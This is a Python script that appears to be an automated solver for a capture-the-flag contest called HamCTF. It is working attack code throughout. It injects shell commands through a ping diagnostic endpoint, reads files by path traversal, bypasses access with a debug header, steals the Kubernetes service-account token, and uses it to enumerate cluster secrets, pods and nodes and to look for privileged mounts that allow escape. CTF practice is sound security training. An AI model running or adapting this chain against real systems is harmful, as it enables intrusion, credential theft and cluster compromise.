#!/usr/bin/env python3

import json
import re
import ssl
import urllib.request
import urllib.parse
import subprocess

BASE = "https://ctf.seoeh.ir"

FLAGS = set()

CTX = ssl._create_unverified_context()


def banner(title):
    print()
    print("=" * 70)
    print(title)
    print("=" * 70)


def extract_flags(text):
    if not text:
        return []

    found = re.findall(r'HAMAMOOZ\{[^}]+\}', text)

    for flag in found:
        FLAGS.add(flag)

    return found


def diag(command):
    """
    Execute command inside the vulnerable backend.

    IMPORTANT:
    Kubernetes DNS names such as kubernetes.default.svc
    must be resolved from inside the cluster.
    """

    payload = {
        "host": "127.0.0.1; " + command
    }

    data = json.dumps(payload).encode()

    req = urllib.request.Request(
        BASE + "/api/diag/ping",
        data=data,
        headers={
            "Content-Type": "application/json"
        },
        method="POST"
    )

    try:
        with urllib.request.urlopen(
            req,
            context=CTX,
            timeout=15
        ) as response:

            raw = response.read().decode(
                errors="replace"
            )

            try:
                obj = json.loads(raw)
                return obj.get("output", raw)
            except Exception:
                return raw

    except Exception as e:
        print("[!] diag failed:", e)
        return ""


def remote_python(code):
    """
    Run Python inside the backend container.

    This is the important part:
    Kubernetes API requests happen remotely,
    where kubernetes.default.svc resolves.
    """

    encoded = urllib.parse.quote(
        code,
        safe=""
    )

    command = (
        "python3 -c "
        + urllib.parse.quote(
            code,
            safe="'\"=:+/_.,(){}[] "
        )
    )

    return diag(command)


def get_serviceaccount_token():
    banner("Kubernetes Service Account")

    output = diag(
        "cat "
        "/var/run/secrets/kubernetes.io/serviceaccount/token"
    )

    if output:
        token = output.strip()

        # JWT tokens normally contain two dots.
        if token.count(".") == 2:
            print("[+] Service-account token obtained")
            return token

    print("[-] Could not obtain service-account token")
    return None


def kube_api(path):
    """
    Query Kubernetes API from INSIDE the backend.

    Do NOT use urllib.request from the local machine.
    """

    py = r'''
import urllib.request
import ssl
import json

base = "/var/run/secrets/kubernetes.io/serviceaccount"
token = open(base + "/token").read().strip()

path = PATH_PLACEHOLDER

url = "https://kubernetes.default.svc" + path

req = urllib.request.Request(
    url,
    headers={
        "Authorization": "Bearer " + token
    }
)

try:
    response = urllib.request.urlopen(
        req,
        context=ssl._create_unverified_context(),
        timeout=10
    )

    print(response.read().decode(errors="replace"))

except Exception as e:
    print("KUBE_ERROR:", repr(e))
'''

    py = py.replace(
        "PATH_PLACEHOLDER",
        repr(path)
    )

    # Use base64 so shell quoting cannot corrupt the Python.
    import base64

    encoded = base64.b64encode(
        py.encode()
    ).decode()

    command = (
        "echo "
        + encoded
        + " | base64 -d | python3"
    )

    return diag(command)


def flag_path_traversal():
    banner("FLAG 3 - Path Traversal")

    url = (
        BASE
        + "/api/reports/download"
        + "?file="
        + urllib.parse.quote("../flag.txt")
    )

    try:
        with urllib.request.urlopen(
            url,
            context=CTX,
            timeout=10
        ) as r:
            output = r.read().decode(
                errors="replace"
            )

            print(output)
            extract_flags(output)

    except Exception as e:
        print("[-] Path traversal failed:", e)


def flag_debug_header():
    banner("FLAG 5 - Debug Header")

    req = urllib.request.Request(
        BASE + "/api/internal/flag",
        headers={
            "X-Debug-Mode": "true"
        }
    )

    try:
        with urllib.request.urlopen(
            req,
            context=CTX,
            timeout=10
        ) as r:

            output = r.read().decode(
                errors="replace"
            )

            print(output)
            extract_flags(output)

    except Exception as e:
        print("[-] Debug endpoint failed:", e)


def flag_command_injection():
    banner("FLAG 8 - Command Injection")

    output = diag(
        "cat /opt/.sysdiag-7e3f9a2c4b1d8e5f/flag.txt"
    )

    print(output)
    extract_flags(output)


def enumerate_kubernetes():
    banner("Kubernetes Enumeration")

    paths = [
        "/version",
        "/api",
        "/apis",
        "/api/v1/namespaces",
        "/api/v1/pods",
        "/api/v1/services",
        "/api/v1/nodes",
        "/api/v1/namespaces/ctf-secrets/secrets",
        "/api/v1/namespaces/internal-tools/services",
        "/api/v1/namespaces/escape-zone/pods",
    ]

    results = {}

    for path in paths:

        print()
        print("[*]", path)

        output = kube_api(path)

        if output:
            print(output[:5000])

            extract_flags(output)

            results[path] = output

    return results


def get_flag_secret():
    banner("FLAG 11 - Kubernetes Secret")

    output = kube_api(
        "/api/v1/namespaces/"
        "ctf-secrets/secrets/flag-secret"
    )

    if not output:
        print("[-] Flag secret request failed")
        return

    print(output)

    extract_flags(output)

    # Also decode the Kubernetes Secret directly.
    try:
        data = json.loads(output)

        secret_data = data.get(
            "data",
            {}
        )

        for key, value in secret_data.items():

            import base64

            decoded = base64.b64decode(
                value
            ).decode(
                errors="replace"
            )

            print(
                "[+]",
                key,
                "=",
                decoded
            )

            extract_flags(decoded)

    except Exception as e:
        print(
            "[!] Secret decode failed:",
            e
        )


def inspect_legacy_worker():
    banner("legacy-worker Inspection")

    output = kube_api(
        "/api/v1/namespaces/"
        "escape-zone/pods/legacy-worker"
    )

    if not output:
        print("[-] Pod inspection failed")
        return

    print(output[:10000])

    extract_flags(output)

    # Look for interesting configuration.
    interesting = [
        "privileged",
        "hostPath",
        "mountPath",
        "docker.sock",
        "host-root",
        "ctf-worker2",
    ]

    print()

    for item in interesting:

        if item in output:
            print(
                "[+] Found:",
                item
            )


def enumerate_nodes():
    banner("Kubernetes Nodes")

    output = kube_api(
        "/api/v1/nodes"
    )

    if not output:
        print("[-] Node enumeration failed")
        return

    print(output[:10000])

    extract_flags(output)


def main():

    print(r"""
╔══════════════════════════════════════════════════════════╗
║                 HamCTF Automated Solver                  ║
╚══════════════════════════════════════════════════════════╝
""")

    # Direct HTTP flags.
    flag_path_traversal()
    flag_debug_header()
    flag_command_injection()

    # Get token only as confirmation.
    token = get_serviceaccount_token()

    if not token:
        print(
            "[!] Kubernetes enumeration skipped"
        )
    else:

        print(
            "[+] Token length:",
            len(token)
        )

        # IMPORTANT:
        # Do NOT construct urllib requests locally
        # to kubernetes.default.svc.
        #
        # kube_api() executes them remotely.
        enumerate_kubernetes()
        get_flag_secret()
        inspect_legacy_worker()
        enumerate_nodes()

    banner("FOUND FLAGS")

    for flag in sorted(FLAGS):
        print("[+]", flag)

    print()
    print("Total:", len(FLAGS))


if __name__ == "__main__":
    main()
